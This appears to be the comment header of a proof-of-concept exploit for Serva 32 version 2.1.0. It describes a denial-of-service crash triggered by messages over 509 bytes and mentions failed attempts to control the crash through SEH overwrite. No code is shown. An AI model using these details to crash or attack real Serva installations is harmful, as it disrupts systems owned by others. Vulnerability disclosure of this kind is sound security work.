#Version 2.1.0 Only prior versions are not vulnerable
#Tested on Windows 8, Windows 7, Windows XP SP1-3
#CVE to be established today or tomorrow.
#
#This is the serva 32 Proof Of Concept exploit discovered and written by Sapling. At this
#time the exploit is only a denial of service but evidence show it may be controllable.
#The difficulty with controlling it at this point was the failure to overwrite the SEH
#chains or bypass them. The crash occurs when sending a message longer than 509 bytes long
